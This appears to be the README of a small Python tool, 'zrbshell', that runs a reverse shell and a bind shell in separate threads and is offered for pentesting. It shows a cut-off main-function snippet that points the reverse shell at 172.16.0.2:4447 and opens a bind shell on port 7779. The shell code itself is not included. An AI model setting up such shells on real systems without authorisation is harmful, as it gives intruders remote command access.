# zrbshell
Reverse &amp; Bind Shell, Multithreaded

This script could be used on some case of Pentesting. It creates two threads one for reverse shell and another for bind shell. 
To change the IPs, Ports, go to the main function, and adjust the parameters of the objects : ZRSH and ZBSH.

#====================================================================
if __name__=='__main__':

	ready_threads = []

	try:

		start_sending = threading.Event()
		
		rsh = ZRSH ( '172.16.0.2', 4447, start_sending)
		bsh = ZBSH ( 7779, start_sending)
		...
		...
		...

#====================================================================

Enjoy !